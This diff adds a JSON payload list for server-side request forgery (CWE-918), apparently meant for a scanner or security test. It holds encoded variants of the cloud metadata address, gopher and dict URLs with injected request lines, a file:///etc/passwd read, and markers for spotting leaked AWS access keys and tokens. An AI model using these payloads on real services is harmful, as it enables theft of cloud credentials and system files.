@@ -1,0 +1,14 @@
+{
+  "variants": {
+    "aws": ["169.254.169.254", "0xA9.0xFE.0xA9.0xFE", "0xA9FEA9FE", "2852039166", "[::ffff:169.254.169.254]", "[::ffff:a9fe:a9fe]", "[fd00:ec2::254]"],
+    "gcp": ["metadata.google.internal"],
+    "azure": ["169.254.169.254/metadata/instance"],
+    "protocol_smuggling": ["file:///etc/passwd", "gopher://169.254.169.254:80/", "dict://169.254.169.254:11211", "gopher://169.254.169.254:80/x%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a"]
+  },
+  "payloads": ["169.254.169.254", "0xA9.0xFE.0xA9.0xFE", "2852039166", "[::ffff:169.254.169.254]", "file:///etc/passwd", "gopher://169.254.169.254:80/"],
+  "markers": ["instance-id", "ami-id", "security-credentials", "AccessKeyId", "SecretAccessKey", "Token", "availability-zone", "instance-identity"],
+  "metadata": {
+    "cwe": "CWE-918",
+    "technique": "SSRF IP encoding bypass + protocol smuggling"
+  }
+}
